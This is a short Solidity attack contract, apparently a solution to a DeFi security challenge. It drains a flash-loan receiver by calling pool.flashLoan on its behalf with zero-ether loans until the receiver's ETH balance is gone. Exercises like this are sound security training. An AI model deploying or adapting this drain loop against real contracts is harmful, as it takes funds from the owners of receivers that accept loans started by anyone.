// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract HackFlashLoanReceiver {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    NaiveReceiverLenderPool private pool;
    FlashLoanReceiver private receiver;

    constructor(address payable _pool, address payable _receiver) {
        pool = NaiveReceiverLenderPool(_pool);
        receiver = FlashLoanReceiver(_receiver);
    }

    function hack() public {
        // call flashLoan until the receiver contract is drained
        uint256 receiverBalance = address(receiver).balance;

        while (receiverBalance > 0) {
            pool.flashLoan(receiver, ETH, 0 ether, bytes(""));
            receiverBalance = address(receiver).balance;
        }
    }
}
